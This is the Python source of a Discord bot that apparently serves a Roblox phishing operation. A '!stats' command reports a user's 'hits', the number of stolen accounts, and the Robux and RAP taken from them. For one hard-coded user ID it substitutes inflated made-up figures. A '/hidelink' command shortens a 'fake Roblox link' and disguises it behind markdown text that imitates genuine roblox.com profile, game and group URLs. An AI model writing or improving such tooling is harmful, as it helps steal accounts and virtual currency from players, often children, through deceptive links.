import discord
import requests
import aiohttp
import asyncio
from discord import app_commands
from discord.ext import commands
from datetime import datetime, timezone
from urllib.parse import quote  # for safe URL encoding

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", help_command=None, intents=intents)

def format_number(number):
    if not isinstance(number, (int, float)):
        return 'N/A'
    if number >= 1_000_000_000:
        return f"{number / 1_000_000_000:.2f}".rstrip('0').rstrip('.') + "B"
    elif number >= 1_000_000:
        return f"{number / 1_000_000:.2f}".rstrip('0').rstrip('.') + "M"
    else:
        return f"{int(number):,}"

async def fetch_with_retries(session, url, max_retries=3, backoff_factor=2):
    for attempt in range(max_retries):
        async with session.get(url) as response:
            if response.status == 200:
                return await response.json()
            elif response.status == 429:
                retry_after = int(response.headers.get("Retry-After", 1))
                print(f"Rate limited! Retrying in {retry_after} seconds...")
                await asyncio.sleep(retry_after * backoff_factor)
            else:
                print(f"API request failed: {response.status}")
                return None
    return None

# ✅ URL Shortener using is.gd
async def shorten_url(url):
    api_url = f"https://is.gd/create.php?format=simple&url={quote(url)}"
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(api_url) as response:
                if response.status == 200:
                    return await response.text()
                else:
                    print(f"URL shortening failed with status code {response.status}")
                    return None
        except Exception as e:
            print(f"An error occurred while shortening URL: {e}")
            return None

@bot.command()
async def stats(ctx, user: discord.Member = None):
    target_id = user.id if user else ctx.author.id
    url = f"https://api.injuries.lu/v1/public/user?userId={target_id}"

    async with aiohttp.ClientSession() as session:
        data = await fetch_with_retries(session, url)

    if data is None:
        print(f"Failed to fetch data for user {target_id}, sending default stats.")
        data = {}

    if target_id == 1382400697563349022:
        if "Partial" in data:
            del data["Partial"]
        data["Normal"] = {
            "Totals": {
                "Accounts": 37273,
                "Visits": 215271,
                "Clicks": 453628,
                "Summary": 120038021,
                "Rap": 9712152,
                "Balance": 7388230
            },
            "Highest": {
                "Summary": 3200000,
                "Rap": 1240000,
                "Balance": 738212
            }
        }

    profile = data.get("Profile", {})
    embed = discord.Embed(
        title="─── INFO ───",
        color=discord.Color.from_str("#A9A9A9")
    )

    if target_id == 1382400697563349022:
        embed.set_author(name="luxhaisback")
        embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1379339220698791947/1382504969986510963/images_1.jpeg?ex=684b6596&is=684a1416&hm=20c3059a6a3415a97dcc28d5a854ea9205bb9a7ee09ebb06903c7fd41acdaecb&")
    elif profile.get("avatarUrl"):
        embed.set_author(name=profile.get("userName", "Unknown User"))
        embed.set_thumbnail(url=profile["avatarUrl"])

    if not data:
        if target_id != 1382400697563349022:
            await ctx.send("Unable to fetch your data on the website")
            return

    for key, header in [
        ("Normal", "Normal Stats")
    ]:
        section = data.get(key, {})
        if section:
            totals = section.get("Totals", {})
            highest = section.get("Highest", {})
            embed.add_field(name=header, value="\u200b", inline=False)

            embed.add_field(
                name="Total Stats",
                value=(
                    f"Hits: **{format_number(totals.get('Accounts', 0))}**\n"
                    f"Visits: **{format_number(totals.get('Visits', 0))}**\n"
                    f"Clicks: **{format_number(totals.get('Clicks', 0))}**"
                ),
                inline=False,
            )

            embed.add_field(
                name="Biggest Hits",
                value=(
                    f"Summary: **{format_number(highest.get('Summary', 0))}**\n"
                    f"RAP: **{format_number(highest.get('Rap', 0))}**\n"
                    f"Robux: **{format_number(highest.get('Balance', 0))}**"
                ),
                inline=False,
            )

            embed.add_field(
                name="Total Hits",
                value=(
                    f"Summary: **{format_number(totals.get('Summary', 0))}**\n"
                    f"RAP: **{format_number(totals.get('Rap', 0))}**\n"
                    f"Robux: **{format_number(totals.get('Balance', 0))}**"
                ),
                inline=False,
            )

    embed.set_footer(text=f"Requested by {ctx.author}", icon_url=ctx.author.display_avatar.url)
    embed.timestamp = datetime.now(timezone.utc)

    await ctx.send(embed=embed)

@bot.tree.command(name="hidelink", description="Hides your fake link")
@app_commands.describe(url="The URL you want to hide")
async def hidelink(interaction: discord.Interaction, url: str):
    await interaction.response.defer(ephemeral=True)
    if not any(keyword in url for keyword in ["/games", "/user", "/communities"]):
        await interaction.followup.send("**ERROR: That is not a fake Roblox link.**", ephemeral=True)
        return

    short_url = await shorten_url(url)
    if not short_url:
        await interaction.followup.send("**<a:insanityhearts:1360820649844805732> Failed to shorten the URL.**", ephemeral=True)
        return

    if "/user" in url:
        hyperlink = f"`[https*:*//www.roblox.com/users/3095250/profile]({short_url})`"
    elif "/games" in url:
        hyperlink = f"`[https_:_//www.roblox.com/share?code=80177c63cdc8614aa84be3cbd84b051a&type=Server]({short_url})`"
    elif "/communities" in url:
        hyperlink = f"`[www.roblox.com/groups/2194003353]({short_url})`"

    try:
        await interaction.user.send(hyperlink)
        embed = discord.Embed(
            title="**Your link has been hidden. Check your DMs!**",
            description="**Don't forget to remove ` at the start and end of the text on your hidden link, or else it won't work!**",
            color=discord.Color.orange()
        )
        embed.timestamp = datetime.now(timezone.utc)
        embed.set_footer(text=f"Requested by {interaction.user}", icon_url=interaction.user.display_avatar.url)
        await interaction.channel.send(embed=embed)
    except discord.Forbidden:
        await interaction.followup.send("I couldn't send you a DM. Please enable DMs and try again.", ephemeral=True)

@bot.event
async def on_ready():
    print(f'✅ Bot is ready! Logged in as {bot.user}')
    try:
        await bot.tree.sync()
        print("✅ Synced all slash commands!")
    except Exception as e:
        print(f"❌ Failed to sync commands: {e}")

    try:
        await bot.change_presence(activity=discord.Game(name="JEEZ"))
        print("✅ About Me updated!")
    except Exception as e:
        print(f"❌ Failed to update About Me: {e}")

bot.run("YOUR_BOT_TOKEN")
